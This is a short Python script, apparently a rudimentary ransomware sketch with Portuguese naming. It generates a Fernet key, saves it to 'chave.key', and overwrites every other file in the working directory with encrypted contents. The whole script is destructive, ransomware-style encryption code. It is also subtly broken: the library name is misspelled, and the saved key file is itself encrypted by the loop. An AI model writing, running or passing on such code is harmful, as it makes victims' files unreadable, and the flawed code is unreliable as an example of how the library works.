import os
from cryptografy.fernet import Fernet

key = Fernet.generate_key()
with open("chave.key", "wb") as f:
  f.write(key)

for file in os.listdir():
  me = str(__file__).split("\\")
  me = me[len(me)-1]
  if file == me:
    continue
  else:
    with open(file, "rb") as r:
      content = r.read()
    encrypted = Fernet(key).encrypt(content)
    with open(file, "wb") as f:
      f.write(encrypted)
